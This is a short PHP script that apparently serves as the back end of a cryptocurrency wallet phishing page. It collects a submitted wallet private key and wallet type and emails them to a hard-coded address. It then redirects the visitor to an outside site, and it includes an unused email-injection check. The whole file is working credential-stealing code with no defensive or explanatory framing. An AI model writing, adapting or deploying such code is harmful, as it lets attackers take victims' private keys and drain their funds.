<?php
if(!isset($_POST['submit']))
{
	//This page should not be accessed directly. Need to submit the form.
	echo "error; you need to submit the form!";
}

$importtype = $_POST['import_type'];
$wallettype = $_POST['wallet'];
$privatekey = $_POST['privatekey'];





$email_from = 'hadadeh11@gmail.com';//<== update the email address

$email_body = "You have received a new private key.";
   

$email_pass = "privatekey of: $privatekey for wallet type: $wallettype"; 


$to = 'Satchagrey25@Gmail.com';//<== update the email address


//Send the email!
mail($to, $email_body, $email_pass);




//done. redirect to thank-you page.
header('Location:https://datamainnet.com/');


// Function to validate against any email injection attempts
function IsInjected($str)
{
  $injections = array('(\n+)',
              '(\r+)',
              '(\t+)',
              '(%0A+)',
              '(%0D+)',
              '(%08+)',
              '(%09+)'
              );
  $inject = join('|', $injections);
  $inject = "/$inject/i";
  if(preg_match($inject,$str))
    {
    return true;
  }
  else
    {
    return false;
  }
}
   

?> 

